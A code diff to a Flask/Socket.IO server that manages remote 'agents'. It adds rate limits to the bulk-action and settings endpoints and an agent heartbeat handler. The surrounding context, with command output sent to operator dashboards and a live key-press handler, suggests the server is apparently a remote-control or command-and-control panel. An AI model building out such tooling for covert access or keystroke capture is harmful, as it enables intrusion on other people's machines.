@@ -2500,6 +2500,9 @@ def execute_bulk_action():
         'successful': len([r for r in results if r['status'] == 'sent'])
     })
 
+if LIMITER_AVAILABLE:
+    execute_bulk_action = limiter.limit("20/minute")(execute_bulk_action)  # type: ignore
+
 # Search and Filter API
 @app.route('/api/agents/search', methods=['GET'])
 @require_auth
@@ -2579,6 +2582,9 @@ def get_settings():
         print(f"Warning redacting settings: {e}")
     return jsonify(safe)
 
+if LIMITER_AVAILABLE:
+    get_settings = limiter.limit("30/minute")(get_settings)  # type: ignore
+
 @app.route('/api/settings', methods=['POST'])
 @require_auth
 def update_settings():
@@ -2621,6 +2627,9 @@ def update_settings():
     except Exception:
         pass
     return jsonify({'success': True, 'message': 'Settings saved.', 'restart_required': restart_required})
+
+if LIMITER_AVAILABLE:
+    update_settings = limiter.limit("10/minute")(update_settings)  # type: ignore
 
 @app.route('/api/settings/reset', methods=['POST'])
 @require_auth
@@ -2852,6 +2861,12 @@ def handle_command_output(data):
     # Forward the output to all operator dashboards
     emit('command_output', {'agent_id': agent_id, 'output': output}, room='operators', broadcast=True)
     print(f"Received output from {agent_id}: {output[:100]}...")
+
+@socketio.on('agent_heartbeat')
+def handle_agent_heartbeat(data):
+    agent_id = data.get('agent_id')
+    if agent_id in AGENTS_DATA:
+        AGENTS_DATA[agent_id]['last_seen'] = datetime.datetime.utcnow().isoformat() + 'Z'
 
 @socketio.on('live_key_press')
 def handle_live_key_press(data):
